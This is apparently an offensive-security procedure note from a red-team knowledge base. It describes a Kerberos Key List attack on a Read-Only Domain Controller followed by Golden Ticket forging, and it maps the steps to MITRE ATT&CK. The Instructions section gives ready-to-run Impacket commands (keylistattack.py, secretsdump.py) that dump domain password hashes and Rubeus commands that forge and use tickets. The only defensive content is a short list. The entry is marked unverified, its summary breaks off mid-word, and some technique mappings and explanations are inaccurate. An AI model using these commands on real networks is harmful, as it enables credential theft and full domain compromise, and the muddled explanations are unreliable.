---
id: eaf3a2c1-e7af-4c95-8f57-e7ff21b3ae5e
name: RODC Key List Extraction and Golden Ticket Creation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:08.322537+00:00'
updated_at: '2023-04-10T20:36:10.960471+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credentials in Files|T1081 - Credentials in Files]]'
- '[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]'
sub_techniques:
- '[[Golden Ticket|T1558.001 - Golden Ticket]]'
- '[[Kerberoasting|T1558.003 - Kerberoasting]]'
tags:
- '[[Active Directory Attacks]]'
- '[[RODC Key List Attack]]'
- '[[RODC - Read Only Domain Controller]]'
commands:
- '[[keylistattack.py defining a target username (-t flag)]]'
- '[[keylistattack.py using SAMR user enumeration without filtering (-full flag)]]'
- '[[Rubeus.exe asktgs]]'
- '[[Rubeus.exe golden]]'
- '[[secretsdump.py using the Kerberos Key List Attack option (-use-keylist)]]'
---

# RODC Key List Extraction and Golden Ticket Creation

## Summary

The RODC Key List Attack is a technique used to extract the password hashes of users from a Read Only Domain Controller (RODC). This attack can be performed by an attacker with access to an RODC and the ability to request the Key Distribution Center (KDC) to provide the RODC's Key List. The attacke

## Description

# Description

The RODC Key List Attack is a technique used to extract the password hashes of users from a Read Only Domain Controller (RODC). This attack can be performed by an attacker with access to an RODC and the ability to request the Key Distribution Center (KDC) to provide the RODC's Key List. The attacker can then use this information to perform a Golden Ticket attack, which allows the attacker to generate a valid Kerberos ticket for any user in the domain, giving them full access to the domain.

This attack can be devastating to an organization as it allows an attacker to bypass authentication and gain access to sensitive data and systems.

From a technical perspective, the RODC Key List Attack involves requesting the KDC to provide the RODC's Key List, which contains the password hashes of users in the domain. The attacker can then use a tool like Rubeus to create a Golden Ticket, which allows them to generate a valid Kerberos ticket for any user in the domain.

The business value of this attack is that it allows an attacker to gain access to sensitive data and systems without being detected. It highlights the importance of securing RODCs and implementing proper access controls to prevent unauthorized access.

 

## Requirements

1. Access to an RODC

1. Ability to request the KDC to provide the RODC's Key List

1. Impacket and Rubeus tools

 

## Defense

1. Implement proper access controls to prevent unauthorized access to RODCs

1. Monitor for unusual activity, such as requests for the RODC's Key List

1. Implement multi-factor authentication to prevent Golden Ticket attacks

 

## Objectives

1. Extract password hashes of users from an RODC

1. Create a Golden Ticket for any user in the domain

 

# Instructions

1. Use these commands to perform a Kerberos Key List Attack using Impacket.

 



**Code**: [[# keylistattack.py using SAMR user enumeration wit]]



> The Kerberos Key List Attack is a method of extracting password hashes from a domain controller by requesting a list of keys that are used to encrypt the Kerberos tickets. The keylistattack.py and secretsdump.py commands are part of the Impacket toolkit and can be used to perform this attack. 

The keylistattack.py command can be used to perform a Kerberos Key List Attack using SAMR user enumeration without filtering (-full flag) or by defining a target username (-t flag). The -rodcNo and -rodcKey options are used to specify the RODC number and key respectively.

The secretsdump.py command can be used to perform a Kerberos Key List Attack using the -use-keylist option. The DOMAIN/user:password@host option is used to specify the domain, user, password, and host respectively. The -rodcNo and -rodcKey options are used to specify the RODC number and key respectively.



**Command** ([[keylistattack.py using SAMR user enumeration without filtering (-full flag)]]):

```bash
keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full
```





**Command** ([[keylistattack.py defining a target username (-t flag)]]):

```bash
keylistattack.py -kdc server.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST
```





**Command** ([[secretsdump.py using the Kerberos Key List Attack option (-use-keylist)]]):

```bash
secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist
```



2. This command is used to create a Golden Ticket using Rubeus. The 'golden' option is used to create the ticket and the '/rodcNumber' flag specifies the RODC number. The '/aes256' flag specifies the AES256 key to encrypt the ticket. The '/user' flag specifies the user account to create the ticket for. The '/id' flag specifies the user ID. The '/domain' flag specifies the domain name. The '/sid' flag specifies the user's SID. The 'asktgs' option is used to request a TGS for a specified service. The '/enctype' flag specifies the encryption type. The '/keyList' flag requests all available keys for the specified service. The '/service' flag specifies the service name in the format 'service/hostname'. The '/dc' flag specifies the domain controller to use. The '/ticket' flag specifies the TGT ticket to use.

 



**Code**: [[Rubeus.exe golden /rodcNumber:25078 /aes256:eacd89]]



> This command is useful for attackers who have gained access to a domain controller and want to create a Golden Ticket to maintain persistent access to the network. A Golden Ticket is a forged Kerberos ticket that grants the attacker full access to the domain. The Rubeus tool is commonly used by attackers to create and use Golden Tickets.



**Command** ([[Rubeus.exe golden]]):

```bash
Rubeus.exe golden /rodcNumber:25078 /aes256:eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 /user:admin /id:1136 /domain:lab.local /sid:S-1-5-21-1437000690-1664695696-1586295871
```





**Command** ([[Rubeus.exe asktgs]]):

```bash
Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/lab.local /dc:dc1.lab.local /ticket:doIFgzCC[...]wIBBxhYnM=
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credentials in Files|T1081 - Credentials in Files]]
- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]

### Sub-Techniques

- [[Golden Ticket|T1558.001 - Golden Ticket]]
- [[Kerberoasting|T1558.003 - Kerberoasting]]

## Commands Used

- [[keylistattack.py defining a target username (-t flag)]]
- [[keylistattack.py using SAMR user enumeration without filtering (-full flag)]]
- [[Rubeus.exe asktgs]]
- [[Rubeus.exe golden]]
- [[secretsdump.py using the Kerberos Key List Attack option (-use-keylist)]]

## Tags

- [[Active Directory Attacks]]
- [[RODC Key List Attack]]
- [[RODC - Read Only Domain Controller]]


